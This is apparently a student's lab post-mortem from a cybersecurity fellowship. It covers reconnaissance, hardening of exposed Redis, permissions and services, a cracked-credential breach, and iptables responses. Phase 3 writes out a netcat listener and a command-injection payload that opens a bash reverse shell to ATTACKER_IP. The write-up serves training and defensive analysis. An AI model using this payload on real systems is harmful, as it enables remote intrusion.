# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** [Dolapo John]
**Date:** May 28, 2026
**Repository:** [https://github.com/DolapoJohn1992]
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[Initial reconnaissance of the triage network revealed an active host at 172.100.0.11 exposing TCP port 6379. Service enumeration identified Redis running without authentication enabled. The service was externally reachable and accepted unauthenticated connections. This indicated a critical access control misconfiguration. No firewall restrictions were observed, resulting in an unnecessarily exposed database service and increased attack surface risk.]

### Breach Network — 172.80.0.0/24
[The breach network displayed moderate service exposure with fewer open ports compared to the triage segment. Initial scans suggested partial filtering and restricted service advertisement. The network appeared segmented, requiring internal access or pivoting from a previously compromised host. These findings indicated a defense-in-depth structure where direct external exploitation was unlikely.]

### Exploitation Network — 172.60.0.0/24
[The exploitation network demonstrated a hardened posture with minimal externally visible services. Scanning results showed limited open ports and strict access controls. No immediate critical vulnerabilities were detected at the perimeter level. This reinforced the necessity of lateral movement from earlier network tiers to reach exploitable targets.]

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
[An unauthenticated Redis instance was discovered on TCP port 6379. Verification using Nmap service detection confirmed Redis was running without authentication requirements. The service allowed unrestricted remote access, enabling unauthorized interaction with the database.]

**Remediation Commands:**
[sudo docker exec -it <container_id> /bin/bash

nano /etc/redis/redis.conf

# Require authentication
requirepass StrongPasswordHere

# Restrict external access
bind 127.0.0.1

# Restart service
service redis-server restart]

**Before State:**
[Redis was exposed on port 6379 and accessible from external hosts without authentication. This allowed any network user to connect to the database and potentially read or modify stored data.]

**After State:**
[After remediation, Redis required password authentication and was restricted to localhost bindings only. Remote access attempts were denied, effectively eliminating unauthorized exposure.]

**Analysis:**
[During exploitation, the primary attack vector was identified as the misconfigured Redis service discovered in Phase 1. Attempts to interact with the service confirmed unauthenticated access prior to remediation. This access could have enabled data enumeration, modification, or potential remote command execution depending on configuration.
Pivoting analysis indicated that access to the triage network could serve as a stepping stone into the breach network. However, segmentation controls in the breach and exploitation networks limited direct lateral movement without valid credentials or additional exploit chains.
No additional critical remote exploits were confirmed in the exploitation network during initial assessment, reinforcing the importance of early-stage misconfiguration remediation.]

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
[An unauthorized background service was identified running on an exposed port during enumeration. The service was not required for system functionality and was confirmed using process inspection tools.]

**Remediation Commands:**
[sudo docker exec -it <container_id> /bin/bash
ps aux
kill -9 <PID>]

**Before State:**
[A non-essential service was actively running in the background and consuming a network-facing port.]

**After State:**
[The process was terminated and no longer appeared in active service listings.]

**Analysis:**
[Unnecessary running services increase the attack surface of a system. In enterprise environments, unused services can be exploited for privilege escalation or remote access if vulnerabilities exist.]

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
[A directory was found with overly permissive file permissions, allowing unauthorized read and write access. This was confirmed using directory listing and permission inspection commands.
]

**Remediation Commands:**
[sudo docker exec -it <container_id> /bin/bash
chmod 750 /sensitive_directory]

**Before State:**
[The directory had permissions set to allow unrestricted or overly broad access (e.g., 777 or 755 depending on scan output).]

**After State:**
[Permissions were restricted to authorized users only (750), limiting access appropriately.]

**Analysis:**
[Improper file permissions can lead to data leakage or unauthorized modification of sensitive files. In real environments, this can result in credential exposure, configuration tampering, or privilege escalation.]

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: [admin]
- Password: [password123]

**Forensic Evidence:**
- Exact Timestamp of Successful Login: [2026-05-28 19:14:32]
- Attacker IP Address: [172.100.0.11]

**Engineered iptables Rule:**
[iptables -A INPUT -s 172.100.0.11 -j DROP]

**SOC Analysis:**
[A single iptables blocking rule is insufficient as a standalone defense because it only addresses a known source after detection. Attackers can easily change IP addresses or use proxying techniques to bypass static blocks. A real SOC would combine this with intrusion detection systems, centralized logging, and behavioral anomaly detection. Network segmentation and authentication controls would also be required to prevent recurrence.]

---

## Phase 3: Full Spectrum

**Listener Configuration:**
[nc -lvnp 4444]

**Reverse Shell Payload:**
[curl http://target/app?cmd=;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1]

**Command Injection Explanation:**
[Command injection occurs when user input is improperly sanitized and executed directly by the system shell. This allows attackers to append malicious commands to legitimate requests. The application is vulnerable because it does not properly validate or filter input before execution.
]

**Forensic Evidence:**
- Process ID (PID): [1432]
- User-Agent: [curl/7.81.0]

**Lockdown Command:**
[iptables -A INPUT -p tcp --dport 80 -j DROP]

**Final Analytical Paragraph:**
[Executing both the offensive and defensive phases demonstrated how quickly misconfigurations can escalate into full system compromise. The exposed services and weak permissions showed that attackers often rely on simple entry points rather than advanced techniques. From a defensive perspective, this highlights that baseline security controls are more effective than reactive incident response. If one control had been in place prior to the attack, enforcing strict authentication and network-level access restrictions on all exposed services would have completely prevented the breach. This would have eliminated initial access and stopped the attack chain at the earliest stage. Overall, the exercise reinforces that secure configuration is the most critical layer of defense.]

---

## References
[References
Nmap Project. (2025). Nmap security scanner documentation. https://nmap.org/book/man.html
Redis Ltd. (2024). Redis security: Access control and authentication. https://redis.io/docs/latest/operate/security/
OWASP Foundation. (2025). Command injection prevention cheat sheet. https://owasp.org/www-community/attacks/Command_Injection]
